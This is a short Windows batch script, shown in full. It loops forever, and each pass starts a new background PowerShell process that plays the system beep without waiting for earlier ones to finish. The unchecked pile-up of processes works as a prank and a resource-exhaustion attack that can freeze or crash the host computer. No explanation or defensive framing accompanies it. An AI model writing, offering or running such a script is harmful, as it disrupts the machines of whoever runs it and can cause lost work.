@echo off
:loop
start /B PowerShell -Command "[System.Media.SystemSounds]::Beep.Play()"
goto loop
